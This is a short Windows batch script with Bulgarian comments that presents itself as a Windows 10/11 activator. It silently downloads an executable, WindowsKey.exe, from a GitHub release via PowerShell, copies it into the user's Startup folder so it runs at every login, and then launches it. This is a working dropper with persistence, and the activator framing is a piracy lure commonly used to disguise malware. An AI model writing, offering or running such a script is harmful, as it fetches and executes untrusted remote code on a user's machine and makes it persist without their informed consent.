@echo off

:: Първи URL за изтегляне
set "url1=https://github.com/betamod9/Windows-10-and-11-Activator/releases/download/12.27.2024/WindowsKey.exe"
:: Папка за стартиране
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Сваляне на първия файл
powershell -Command ^
    "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri '%url1%' -OutFile $env:TEMP\\WindowsKey.exe"

:: Копиране на файла в папката за стартиране
copy "%TEMP%\WindowsKey.exe" "%startupFolder%\WindowsKey.exe"

:: Изчакване за няколко секунди (по избор)
timeout /t 5 /nobreak >nul

:: Стартиране на файла
start "" "%startupFolder%\WindowsKey.exe"
